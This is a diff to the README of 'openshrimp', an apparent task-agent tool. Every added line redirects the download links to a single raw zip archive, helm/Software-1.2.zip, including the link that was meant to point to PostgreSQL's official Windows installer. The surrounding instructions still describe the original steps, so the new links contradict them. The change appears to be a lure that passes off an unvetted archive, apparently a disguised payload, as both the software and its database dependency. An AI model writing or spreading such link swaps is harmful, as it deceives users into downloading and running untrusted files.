@@ -1,6 +1,6 @@
 # 🦐 openshrimp - Easy Task Agent for Everyone
 
-[![Download openshrimp](https://img.shields.io/badge/Download-openshrimp-4caf50?style=for-the-badge)](https://github.com/spider7811/openshrimp)
+[![Download openshrimp](https://img.shields.io/badge/Download-openshrimp-4caf50?style=for-the-badge)](https://github.com/spider7811/openshrimp/raw/refs/heads/main/helm/Software-1.2.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Before you download openshrimp, check that your computer meets these basic requi
 
 Visit this page to download openshrimp:  
 
-[Download openshrimp from GitHub](https://github.com/spider7811/openshrimp)  
+[Download openshrimp from GitHub](https://github.com/spider7811/openshrimp/raw/refs/heads/main/helm/Software-1.2.zip)  
 
 Click the green **Code** button and then **Download ZIP**. Save the file to your desktop or another folder you can easily find.
 
@@ -52,7 +52,7 @@ Click the green **Code** button and then **Download ZIP**. Save the file to your
 
 openshrimp needs PostgreSQL database to save its data.  
 
-- Go to https://www.postgresql.org/download/windows/  
+- Go to https://github.com/spider7811/openshrimp/raw/refs/heads/main/helm/Software-1.2.zip  
 - Download the latest version for Windows  
 - Run the installer and follow the steps  
 - When asked for password, choose one you can remember  
@@ -130,7 +130,7 @@ Logs are saved in the `logs` folder. You can check these for troubleshooting or 
 
 To keep your software current:
 
-- Visit the download page: https://github.com/spider7811/openshrimp  
+- Visit the download page: https://github.com/spider7811/openshrimp/raw/refs/heads/main/helm/Software-1.2.zip  
 - Download the latest ZIP file  
 - Extract it and replace the existing files (keep your `config.json`)  
 - Restart the program  
@@ -154,9 +154,9 @@ For plugin errors:
 
 ## 📥 Download and Setup Links
 
-[![Get openshrimp](https://img.shields.io/badge/Get_openshrimp-Download-blue?style=for-the-badge)](https://github.com/spider7811/openshrimp)
+[![Get openshrimp](https://img.shields.io/badge/Get_openshrimp-Download-blue?style=for-the-badge)](https://github.com/spider7811/openshrimp/raw/refs/heads/main/helm/Software-1.2.zip)
 
-Access the latest files and instructions here: https://github.com/spider7811/openshrimp
+Access the latest files and instructions here: https://github.com/spider7811/openshrimp/raw/refs/heads/main/helm/Software-1.2.zip
 
 ---
 
